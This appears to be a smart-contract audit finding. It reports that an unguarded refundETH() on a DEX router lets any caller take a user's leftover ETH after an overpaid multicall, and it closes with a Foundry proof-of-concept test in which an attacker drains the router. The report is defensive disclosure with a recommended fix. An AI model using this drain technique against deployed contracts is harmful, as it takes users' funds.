Audit Report

## Title
Unguarded `refundETH()` allows any caller to drain ETH stranded on the router after a partial-value multicall — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`refundETH()` sends the router's entire ETH balance to `msg.sender` with no access control. When a user sends `msg.value > amountIn` via `multicall` without appending a `refundETH()` leg, the excess ETH remains on the router. Any third party can then call `refundETH()` in a subsequent transaction and receive those funds, causing direct loss of user ETH.

## Finding Description
`pay()` in `PeripheryPayments.sol` (L74–77) wraps exactly `value` wei when `nativeBalance >= value`, leaving `nativeBalance - value` ETH on the contract:

```solidity
uint256 nativeBalance = address(this).balance;
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
    // excess ETH stays on router
}
```

`refundETH()` (L58–63) unconditionally transfers the full ETH balance to `msg.sender`:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);
    }
}
```

`multicall` (L39–44) uses `delegatecall`, so `msg.sender` is the original user only during the multicall execution. Once the multicall transaction is mined, any subsequent caller of `refundETH()` becomes `msg.sender` and receives all stranded ETH. The `receive()` guard (L32–34) only blocks direct `.call{value}("")` transfers from non-WETH addresses and does not prevent `msg.value` arriving through `multicall`. There is no mechanism that enforces the user to include `refundETH()` as the last leg of their multicall, and no transient storage or other tracking of the original depositor.

## Impact Explanation
Direct loss of user ETH principal. A victim who sends `msg.value = X` but whose swap consumes only `Y < X` loses `X - Y` ETH to any attacker who calls `refundETH()` before the victim can recover it. The loss is fully extractable with zero capital requirement by the attacker. This meets the "direct loss of user principal" threshold under the contest's allowed impact gate.

## Likelihood Explanation
Moderate. Native-ETH swap flows are explicitly supported and tested. Users or integrators who send a round-number `msg.value` (e.g., to cover slippage headroom) without appending `refundETH()` create the vulnerable state. MEV bots monitoring the mempool can detect stranded ETH and front-run the victim's recovery attempt in the same block.

## Recommendation
Track the original `msg.sender` at `multicall` entry in transient storage and enforce in `refundETH()` that only that address can call it. Alternatively, automatically sweep excess ETH back to `msg.sender` at the end of `multicall` rather than relying on the caller to append a `refundETH()` leg.

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "contracts/interfaces/IMetricOmmSimpleRouter.sol";
import {SimpleRouterTestBase} from "test/helpers/SimpleRouterTestBase.sol";

contract RefundETHTheftTest is SimpleRouterTestBase {
    address attacker = makeAddr("attacker");

    function test_attacker_steals_stranded_ETH() public {
        uint128 amountIn = 1_000;
        uint256 msgValue = 2 ether;

        vm.deal(swapper, msgValue);
        vm.prank(swapper);

        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(
            router.exactInputSingle.selector,
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool: address(pool),
                tokenIn: address(weth),
                tokenOut: address(token1),
                zeroForOne: true,
                amountIn: amountIn,
                amountOutMinimum: 0,
                recipient: recipient,
                deadline: block.timestamp + 1 hours,
                priceLimitX64: 0,
                extensionData: ""
            })
        );
        // Victim omits refundETH() — excess ETH stays on router
        router.multicall{value: msgValue}(calls);

        uint256 stranded = address(router).balance;
        assertGt(stranded, 0, "ETH stranded on router");

        // Attacker drains in a separate transaction
        vm.prank(attacker);
        router.refundETH();

        assertEq(attacker.balance, stranded, "attacker stole victim ETH");
        assertEq(address(router).balance, 0, "router drained");
    }
}
```
